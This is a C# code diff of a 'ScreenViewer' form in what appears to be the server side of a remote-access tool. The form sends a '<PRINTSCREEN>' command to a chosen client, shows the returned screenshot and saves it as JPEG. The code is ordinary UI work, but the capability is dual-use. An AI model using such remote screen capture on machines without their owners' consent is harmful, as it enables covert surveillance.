@@ -1,28 +1,25 @@
 ﻿using Server.Server;
-using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
+using System.Drawing.Imaging;
 using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace Server.UI
 {
     public partial class ScreenViewer : Form
     {
-        private static Socket client;
+        private static Client client;
         private static byte[] imageStream;
         private static Image printScreenImage;
         private static Thread dataReceiveThread;
 
-        public ScreenViewer(int clientIndex)
+        public ScreenViewer(Client selectedClient)
         {
             InitializeComponent();
-            client = SocketServer.GetClient(clientIndex).socket;
+            client = selectedClient;
+            for (int i = 0; i < client.iScreenCount; i++)
+                screensBox.Items.Insert(i, (i + 1).ToString());
+
+            screensBox.SelectedIndex = 0;
         }
 
         public static void StartDataReceiveThread()
@@ -38,7 +35,7 @@ namespace Server.UI
                 byte[] buffer = new byte[1048576];
                 try
                 {
-                    client.Receive(buffer);
+                    client.socket.Receive(buffer);
                 }
                 catch (SocketException)
                 {
@@ -66,7 +63,12 @@ namespace Server.UI
 
         private void reqBtn_Click(object sender, EventArgs e)
         {
-            Main.socketServer.Send(client, "<PRINTSCREEN>");
+            if (screensBox.Text == null)
+            {
+                Log.Error("Failed to get client screens.");
+                return;
+            }
+            SocketServer.Send(client.socket, "<PRINTSCREEN>" + screensBox.Text);
         }
 
         private void uiUpdateTimer_Tick(object sender, EventArgs e)
@@ -77,7 +79,7 @@ namespace Server.UI
                 switch (Main.uiRequests.GetRequestType(requestID)) // Check request type and call the correct function.
                 {
                     case RequestUI.RequestType.UI_UPDATE_SCREENSHOT:
-                        pictureBox1.Image = printScreenImage;
+                        imageBox.Image = printScreenImage;
                         imageStream = Array.Empty<byte>();
                         break;
                 }
@@ -86,7 +88,30 @@ namespace Server.UI
 
         private void ScreenViewer_Load(object sender, EventArgs e)
         {
+            saveImageToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Image);
             Icon = WinIcons.Extract("shell32.dll", (int)WinIcons.ShellID.Desktop, false);
+        }
+
+        private void contextMenu_Opening(object sender, CancelEventArgs e)
+        {
+            if(imageBox.Image == null)
+                e.Cancel = true;
+        }
+
+        private void saveImageToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (SaveFileDialog SFD = new SaveFileDialog())
+            {
+                SFD.Title = "Save image to...";
+                SFD.Filter = "JPEG File(*.jpeg)|*.jpeg";
+                SFD.FileName = $"Screenshot {DateTime.Now}";
+
+                if (SFD.ShowDialog() == DialogResult.OK)
+                {
+                    Bitmap bitmapImage = new(imageBox.Image);
+                    bitmapImage.Save(SFD.FileName, ImageFormat.Jpeg);
+                }
+            }
         }
     }
 }
